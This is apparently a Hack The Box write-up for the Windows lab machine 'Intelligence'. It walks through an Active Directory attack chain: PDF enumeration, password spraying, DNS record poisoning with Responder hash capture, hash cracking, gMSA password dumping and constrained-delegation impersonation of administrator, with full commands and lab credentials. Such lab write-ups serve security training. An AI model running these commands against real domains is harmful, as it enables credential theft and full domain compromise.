---
icon: windows
---

# Intelligence - Medium

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/intelligence"><strong>Intelligence</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.248 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 17:54 EST
Nmap scan report for 10.10.10.248
Host is up (0.041s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-20 06:56:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-11-20T06:57:56+00:00; +8h00m07s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-20T06:57:57+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-20T06:57:56+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-11-20T06:57:57+00:00; +8h00m07s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m06s, deviation: 0s, median: 8h00m06s
| smb2-time: 
|   date: 2025-11-20T06:57:20
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   53.61 ms 10.10.16.1
2   53.98 ms 10.10.10.248
```

The nmap scan discovered the domain name of intelligence.htb and dc.intelligence.htb. I'll add it to my `/etc/hosts/` file

```bash
10.10.10.248	intelligence.htb dc.intelligence.htb
```

### <mark style="color:$primary;">Website Port 80</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the main page there are 2 documents we can check out&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Both documents contain lorem ipsum text

However downloading the files and checking ther metada we discover some usernames.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can verify these users using Kerberos!

### <mark style="color:$primary;">Kerberos - TCP 88</mark>

```bash
kerbrute userenum --dc 10.10.10.248 -d intelligence.htb usernames
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking for AS-REP-Roasting

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.248 'intelligence.htb/' -usersfile usernames -format hashcat -outputfile hashes.aspreroast
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

No luck here!

If we pay close attention to the filenames of the PDF's they are being created in a pattern YYYY-MM-DD-upload.pdf There could be other PDF's of the same format!&#x20;

### <mark style="color:$primary;">Discovered Additional PDF's</mark>

I'll use a python script to look for other PDF's of the same format:

```python
#!/usr/bin/env python3

import datetime
import requests

t = datetime.datetime(2020,  1, 1)
end = datetime.datetime(2021, 7, 4)

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
# Increamenting the date, the script adds 1 day to t
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
```

I'll use July 4th as the end date, this is the date after the box was released. So there cannot be anything after that date

<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

They script returns a lot of files! It is going to take a while to sip to each so I will automate the script. I'll add an array of keywords that I am interested in and have it print the text contents to the screen. I'll also add some logic to record unique users and write them to a file at the end.

```python
#!/usr/bin/env python3

import datetime
import io
import requests
from pypdf import PdfReader

# Initialize the start and end dates
t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)

# Keywords to search for in the PDFs
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']

# Set to store unique user names (creators)
users = set()

# Start an infinite loop to go through the dates
while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)

    # If the request is successful, status code 200
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            reader = PdfReader(data)

            # Add creator information (from PDF metadata)
            metadata = reader.metadata
            if '/Creator' in metadata:
                users.add(metadata['/Creator'])

            # Loop through all the pages and extract text
            for page in reader.pages:
                text = page.extract_text()

                # Check if any keyword is found in the text
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')

    # Increment the date by 1 day
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

# Write the unique creators (users) to a file
with open('users', 'w') as f:
    f.write('\n'.join(users))

# How It Works:
# Date Iteration: It loops over the dates from January 1, 2020, to July 4, 2021,
# generating URLs for each date and requesting the corresponding PDF.

# PDF Reading: It reads the PDF using pypdf.PdfReader, 
# extracting the creator metadata and the text from each page.

# Keyword Search: It searches for the specified keywords in the text of each page. 
# If any keyword is found, it prints the URL and the extracted text.

# Storing Creators: It stores unique creators (/Creator metadata) in a set, ensuring no duplicates.

# Saving Results: After processing all the PDFs, it writes the unique creators (user names) to a file called users.
```

The script discovers 2 new messages and 30 users. We have a possible password!

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's validate the usernames with kerbrute as we did earlier!

### <mark style="color:$primary;">Kerbrute -> validating usernames</mark>

```bash
kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can try password spraying these users with the default password we discovered earlier and see if someone forgot to change it.

### <mark style="color:$primary;">Credential Spraying</mark>

{% code overflow="wrap" %}
```bash
netexec smb intelligence.htb -u users -p NewIntelligenceCorpUser9876 --continue-on-success
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tiffany forgot to change her password! Let's see what level of access we have with Tiffany!

```bash
Tiffany.Molina:NewIntelligenceCorpUser9876
```

### <mark style="color:$primary;">SMB Enumeration</mark>

{% code overflow="wrap" %}
```bash
netexec smb intelligence.htb -u tiffany.molina -p NewIntelligenceCorpUser9876 --shares
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking out the SMB shares we come across a non default share that we have access to. Let's check it out

{% code overflow="wrap" %}
```bash
smbclient \\\\intelligence.htb\\IT -U "tiffany.molina%NewIntelligenceCorpUser9876"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a script here I am going to download it and take a look at it.

```ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

```

The script goes into LDAP and gets a list of computers that start with "web". Then it will try to issue a web request to that server \[with the running users’s credentials], and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.

With this in mind we can try to use [**dnstool.py**](https://github.com/dirkjanm/krbrelayx) to modify the DNS records via LDAP and add our own server than have responder ready so we can capture the credentials!

I know Tiffany has access to LDAP but I don't know if she has the permissions necessary to make those changes. We can try and see!

{% code overflow="wrap" %}
```bash
python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r web-deimos -d 10.10.16.2 10.10.10.248
```
{% endcode %}

* <mark style="color:$primary;">**-u**</mark> intelligence\\\Tiffany.Molina - The user to authenticate as;
* <mark style="color:$primary;">**-p**</mark> NewIntelligenceCorpUser9876 - The user’s password;
* <mark style="color:$primary;">**-a**</mark> - Adding a new record;
* <mark style="color:$primary;">**-r**</mark> web-deimos - The domain to add;
* <mark style="color:$primary;">**-d**</mark> 10.10.16.2 - The data to add, in this case, the IP to resolve web-deimos to;
* And the Hostname at the end 10.10.10.248

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ok it seemed to have worked!

Now have responder ready and wait for the request to come through!

```bash
sudo responder -I tun0
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nice we managed to capture Ted.Graves NTLMv2 Hash. We can try cracking it

### <mark style="color:$primary;">Cracking NTLMv2 Hash</mark>

```bash
hashcat ted.graves-ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

```bash
hashcat ted.graves-ntlmv2.hash /usr/share/wordlists/rockyou.txt --showb
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We managed to crack it and get his password:

```
ted.graves:Mr.Teddy
```

Ted does not have access to anything new. I am going to do bloodhound collection using netexec and checkout bloodhound&#x20;

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```bash
netexec ldap intelligence.htb -u ted.graves -p 'Mr.Teddy' --bloodhound --collection All --dns-server 10.10.10.248
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

start bloodhound

```bash
sudo neo4j start
bloodhound
```

#### <mark style="color:$primary;">Shortest Path from Owned Principals</mark>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ted.Graves is in the ITSupport group, which has <mark style="color:$primary;">**ReadGMSAPassword**</mark> on SVC\_INT$.&#x20;

The svc\_int$ account has <mark style="color:$primary;">**AllowedToDelegate**</mark> on the DC:

With <mark style="color:$primary;">**ReadGMSAPassword**</mark> we can use a python tool for extracting GMSA passwords

{% embed url="https://github.com/micahvandeusen/gMSADumper" %}

### <mark style="color:$primary;">ReadGMSAPassword</mark>

```bash
python gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It worked we managed to get svc\_int$ NTLM hash!

### <mark style="color:$primary;">AllowedToDelegate</mark>

#### Requesting forged ticket from the delegated service

First we must sync our time with the target otherwise kerberos will yell at us

```bash
service virtualbox-guest-utils stop
sudo ntpdate 10.10.10.248
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5389896c2609ab8717b9d8f360f760ae -impersonate administrator intelligence.htb/svc_int$
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now to get a shell using the ticket I'll use wmiexec that comes with impacket.

* <mark style="color:$primary;">**-k**</mark> will specify Kerberos authentication

I’ll set the <mark style="color:$primary;">**KRB5CCNAME**</mark> environment variable to point to the ticket file I want to use.

{% code overflow="wrap" %}
```bash
KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are admin!

